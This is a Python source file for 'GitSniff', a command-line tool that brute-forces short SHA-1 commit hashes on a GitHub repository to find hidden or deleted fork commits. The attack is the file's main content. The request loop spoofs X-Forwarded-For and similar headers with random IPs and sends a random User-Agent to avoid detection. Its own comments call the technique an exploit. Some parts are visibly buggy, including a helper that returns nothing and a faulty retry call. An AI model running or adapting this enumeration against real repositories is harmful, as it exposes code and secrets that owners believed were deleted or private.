from concurrent.futures import ThreadPoolExecutor
from sys import stderr
import argparse
import signal
from time import sleep
from random import randint, choice

# External library
import requests                 # Originally used http.Client, but it's not thread-safe so we're going to import requests. Lowkey atp just merge this into Python
from tqdm import tqdm

# Declare ANSI color codes
CYAN = "\033[36m"
YELLOW = "\033[93m"
RESET = "\033[0m"

def error(msg:str):
    '''
    Prints a string to stderr
    '''
    tqdm.write(msg, file=stderr)

def get_branch_hashes(api_url:str) -> list[str]:
    '''
    Retrieves the hashes of all commits on the main repository.
    What this means for you is that if an short SHA-1 hash does not match with any hashes here, we might have a fork on our hands
    @param api_url API endpoint for Github commits to this particular repo
    '''
    try:
        response = requests.get(api_url, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"})

        if response.status_code != 200:
            raise Exception(f"response returned a status of {response.status_code}")
    except Exception as err:
        error(f"Unable to reach {api_url}. Everything might be flagged as a fork: {str(err)}")
        return []

    # Retrieve the commit hashes from the JSON response
    api_json = response.json()
    hashes = list(map(lambda x : x["sha"], api_json))

    return hashes
    
def is_fork(short_hash:str, commit_hashes:list[str]):
    '''
    Checks if a short_hash is part of a fork or the main repository.
    Recall that we know something is a fork if it doesn't appear on the list of commit hashes we retrieved from the Github API
    @param short_hash Short SHA-1 Hash
    @param commit_hash List of commit hashes from main repo
    '''

    for long_hash in commit_hashes:
        if long_hash.startswith(short_hash):
            return False
        
    return True

def gen_random_ip():
    return f"{randint(0, 127)}.{randint(0, 127)}.{randint(0, 127)}.{randint(0, 127)}"

def random_letters():
    letters = "abcdefghijklmknopqrstuvwxyz1234567890"
    str = ""

    for i in range(5):
        str += choice(letters)

def check_valid_fork(url:str, commit_hashes:list[str], progress_bar:tqdm, thread_pool:ThreadPoolExecutor):
    '''
    Checks whether a valid commit exists at the URL. The exploit leverages HTTP status codes to determine hidden forks.
    @param url URL of a possible "commit" to check
    @param commit_hashes List of commit hashes on the current repo
    @param tq_func Progress Bar
    @param thread_pool Thread Pool Executor
    '''

    # Generate random IPs so our requests doesn't get marked as "unofficial"
    try:
        response = requests.get(url, headers={
            "X-Originating-IP": gen_random_ip(),
            "X-Forwarded-For": gen_random_ip(),
            "X-Remote-IP": gen_random_ip(),
            "X-Remote-Addr": gen_random_ip(),
            "X-Client-IP": gen_random_ip(),
            "X-Host": gen_random_ip(),
            "X-Forwared-Host": gen_random_ip(),
            "User-Agent": random_letters()
        })

        # If the response is valid, that means we found a commit! Process that response to determine if it's a legit one, or a fork
        if response.status_code == 200:
            # Github doesn't determine whether something is a fork until *after* the web page loads. 
            # However, that's fine because we can just use Github's API to determine if something is a fork
            short_hash = url[url.rfind("/") + 1:]
            if is_fork(short_hash, commit_hashes):
                tqdm.write(f"{YELLOW}[Fork Detected]{RESET} {url}")
            else:
                tqdm.write(f"{CYAN}[Repo Commit]{RESET} {url}")
        elif response.status_code == 429:
            # If we get a 429 error, try again in 15 seconds.
            # This blocks the thread, but we're fine because the errors are gonna block this thread regardless if we don't resolve it
            error(f"Recieved error code 429 for {url}; we're submitting too many requests. Retrying in 15s.")
            sleep(15)
            thread_pool.submit(url, commit_hashes, progress_bar, thread_pool)
            
        # else:
        #     tqdm.write(f"DEBUG: nope we got {response.status_code} for {url}")
    except Exception as err:
        error(f"Issue when validating fork for {url}: {str(err)}")
        return

    progress_bar.update()

def terminate_thread(thread_pool:ThreadPoolExecutor):
    tqdm.write("\nTerminating Threads...")
    try:
        thread_pool.shutdown(wait=False, cancel_futures=True)
    except Exception as err:
        error(f"Error when terminating thread pool: {str(err)}")

    exit(1)

def launch_async(repo_url:str, max_workers:int=3, hash_digits:int=4, rate_limit=450):
    '''
    Asynchronously brute forces Github forks using the first 6 digits of the SHA-1 Hash
    @param repo_url URL of repository to sniff for forks
    @param max_workers The maximum number of worker threads to launch. This is 5 by default. Increase this at your own risk because 429 errors aren't fun
    @param hash_digits The `$git` protocol allows us to access a repository via short SHA-1 Hashes. This param controls the number of digits in the hash (w/ a minimum of 4)\
    '''
    # If there's a / at the end, get rid of that because it messes with string manip
    if repo_url[-1] == "/":
        repo_url = repo_url[:-1]
    
    api_url = f"https://api.github.com/repos/{repo_url[repo_url.find('github.com') + 11:]}/commits"
    commit_hashes = get_branch_hashes(api_url)

    # I know there's a lot of error handling in this script, but Crowdstrike just happened and I'm not trying to shut 8 million computers down
    try:
        thread_pool = ThreadPoolExecutor(max_workers=max_workers, thread_name_prefix="gitsniff")
    except Exception as err:
        error(f"Unable to create Thread Pool: {str(err)}")
        exit(1)

    # From this point forward, if the program ever terminates due to SIGINT/SIGTERM, gracefully handle the threads
    try:
        signal.signal(signal.SIGINT, lambda _rand1, _rand2 : terminate_thread(thread_pool))
        signal.signal(signal.SIGTERM, lambda _rand1, _rand2 : terminate_thread(thread_pool))
    except Exception as err:
        error(f"Unable to register SIGINT handler: {str(err)}")
        terminate_thread(thread_pool)
        exit(1)

    # SHA-1 Hashes are expressed as hex values. We'll just convert them from base 10.
    # That means that in order to "brute force" all the SHA-1 hashes, we'll actually just loop through all possible hex values with $hash_digits in base10, 
    # and then convert it to hex.
    min_hex = 16 ** (hash_digits - 1)               # ie. min for 2 digits is 16 ^ (2 - 1) = 16, which is 0x10
    max_hex = (16 ** hash_digits) - 1                 # ie. max for 2 digits is (16 ^ 2) - 1 = 255, which is 0xFF

    tqdm.write(f"Launching gitsniff on {repo_url} with {max_workers} threads and {rate_limit} query rate limit on {hash_digits} digits...")

    # Run tqdm for a progress bar
    progress_bar = tqdm(range(0, max_hex - min_hex), desc ="GitSniff Status", position=0, leave=True, colour="CYAN")

    for i in range(min_hex, max_hex + 1):
        # Rate limiting - multithreading helps us make this measurement more accurate
        if (i - min_hex + 1) % rate_limit == 0:
            sleep(60)

        curr_hash = hex(i)[2:]                      # Get rid of '0x' because no one rly wants to see that 🗿
        curr_url = f"{repo_url}/commit/{curr_hash}"
        try:
            thread_pool.submit(check_valid_fork, curr_url, commit_hashes, progress_bar, thread_pool)
        except Exception as err:
            error(f"Exception when submitting to concurrent thread pool for hash {curr_hash}: {str(err)}")
            terminate_thread(thread_pool)

    # This shutdown is blocking
    thread_pool.shutdown(wait=True)

    tqdm.write("gitsniff complete.")

if __name__ == "__main__":
    # url = "https://github.com/NotReallyJustin/Generic-Open-AI-Wrapper"
    # launch_async(url)

    tqdm.write(YELLOW)
    tqdm.write("""

   _____   _   _      _____           _    __    __ 
  / ____| (_) | |    / ____|         (_)  / _|  / _|
 | |  __   _  | |_  | (___    _ __    _  | |_  | |_ 
 | | |_ | | | | __|  \\___ \\  | '_ \\  | | |  _| |  _|
 | |__| | | | | |_   ____) | | | | | | | | |   | |  
  \\_____| |_|  \\__| |_____/  |_| |_| |_| |_|   |_|  
    """)
    tqdm.write(RESET)
    tqdm.write("        Sniffing for Buried Forks.\n\n")

    # Argparse the CLI tool
    parser = argparse.ArgumentParser(description="Sniffs for hidden or deleted forks of public (and certain private) Github repos.", prog="GitSniff")
    parser.add_argument("-u", "--url", help="URL of repository. Should look something like \"https://github.com/NotReallyJustin/Generic-Open-AI-Wrapper\".", required=True)
    parser.add_argument("-m", "--maxworkers", help="Maximum number of threads to launch. This defaults to 3.", type=int)
    parser.add_argument("-d", "--digits", help="Number of hexadecimal digits in short SHA-1 hash to fuzz. This defaults to 4 and must be >= 4.", type=int)
    parser.add_argument("-r", "--ratelimit", help="Maximum number of requests to send per minute. This defaults to 450, but you might want to go lower.", type=int)

    result = parser.parse_args()

    # Error checking
    if result.url.find("https://github.com") == -1:
        error("Error: url must point to a Github repository.")
        exit(1)
    
    if result.maxworkers != None and result.maxworkers <= 0:
        error("Error: maxworkers must spawn at least 1 thread.")
        exit(1)

    if result.digits != None and result.digits < 4:
        error("Error: digits must be greater than or equal to 4.")
        exit(1)
    
    if result.ratelimit != None and result.ratelimit <= 0:
        error("Error: ratelimit must be greater than or equal to 1.")

    launch_async(result.url, 3 if result.maxworkers == None else result.maxworkers, 4 if result.digits == None else result.digits, 
                 450 if result.ratelimit == None else result.ratelimit)
